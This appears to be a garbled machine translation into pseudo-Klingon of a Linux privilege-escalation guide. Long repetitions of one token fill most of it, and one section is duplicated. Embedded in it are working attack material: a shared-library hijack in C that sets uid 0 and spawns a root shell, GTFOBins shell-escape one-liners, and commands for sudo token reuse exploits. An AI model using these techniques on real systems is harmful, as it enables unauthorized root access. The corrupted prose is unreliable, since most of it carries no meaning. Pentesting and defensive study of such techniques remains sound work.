vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlh
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
DaH jImej SUID binary vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhut
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
**If you get an error such as**

```
/bin/bash: /usr/bin/sudo: Permission denied
```

**Translation:**

```
/jIn/boS: /usr/bin/sudo: QaDHa'ghach
```
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
DaH jImej 'e' vItlhutlh 'a_function_name' vItlhutlh.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) vItlhutlh Unix binaries curated list 'e' vItlhutlh attacker vItlhutlh bypass local security restrictions. [**GTFOArgs**](https://gtfoargs.github.io/) vItlhutlh same 'ach cases vItlhutlh **only inject arguments** 'e' vItlhutlh command.

project vItlhutlh legitimate functions Unix binaries vItlhutlh abused vItlhutlh break out restricted shells, escalate vItlhutlh maintain elevated privileges, transfer files, spawn bind vItlhutlh reverse shells, facilitate post-exploitation tasks.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

vaj 'e' vItlhutlh `sudo -l` vItlhutlh 'e' vItlhutlh tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) vItlhutlh check 'ach vItlhutlh finds how vItlhutlh exploit any sudo rule.

### Reusing Sudo Tokens

cases vItlhutlh **sudo access** 'ach not password, vItlhutlh escalate privileges vItlhutlh **waiting sudo command execution vItlhutlh hijacking session token**.

Requirements vItlhutlh escalate privileges:

* You already have a shell as user "_sampleuser_"
* "_sampleuser_" vItlhutlh **used `sudo`** vItlhutlh execute something 'e' **last 15mins** (by default that's duration sudo token vItlhutlh allows us vItlhutlh use `sudo` without introducing any password)
* `cat /proc/sys/kernel/yama/ptrace_scope` vItlhutlh 0
* `gdb` vItlhutlh accessible (you can be able vItlhutlh upload it)

(You can temporarily enable `ptrace_scope` with `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` or permanently modifying `/etc/sysctl.d/10-ptrace.conf` vItlhutlh setting `kernel.yama.ptrace_scope = 0`)

If all these requirements vItlhutlh met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo\_inject)

* The **first exploit** (`exploit.sh`) vItlhutlh create binary `activate_sudo_token` vItlhutlh _/tmp_. You can use it vItlhutlh **activate sudo token 'e' your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
* **cha'logh exploit** (`exploit_v2.sh`) **ghItlh** _/tmp_ **root** **jImej** **sh shell** **yIlo'**.
```bash
bash exploit_v2.sh
/tmp/sh -p
```
* **vagh** **exploit** (`exploit_v3.sh`) **yInIDqa' sudoers file** **yIlo'laHbe' sudo tokens** **'ej bIngDaq users Hoch sudo vIlo'laH**.
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

**ghItlhvam** **write permissions** **DaH** **folder** **'ej** **folder** **vItlhutlh** **created files** **DaH** **vItlhutlh** **binary** [**write\_sudo\_token**](https://github.com/nongiach/sudo\_inject/tree/master/extra\_tools) **vIlegh** **sudo token** **user** **'ej PID** **create**.\
**ghobe'},** **'ej** **file** _/var/run/sudo/ts/sampleuser_ **vItlhutlh** **'ej** **shell** **user** **PID 1234** **vItlhutlh**, **sudo privileges** **obtain** **need** **password** **doing**:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

The file `/etc/sudoers` and the files inside `/etc/sudoers.d` configure who can use `sudo` and how. These files **by default can only be read by user root and group root**.\
**If** you can **read** this file you could be able to **obtain some interesting information**, and if you can **write** any file you will be able to **escalate privileges**.

### /etc/sudoers, /etc/sudoers.d

`/etc/sudoers` qajatlh 'ej `/etc/sudoers.d` qajatlhDI'wI' 'ej 'oH **root** user 'ej **root** group **ghItlh** **qatlh**.\
**vaj** 'ej **qatlh** 'e' vItlhutlh **qatlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** 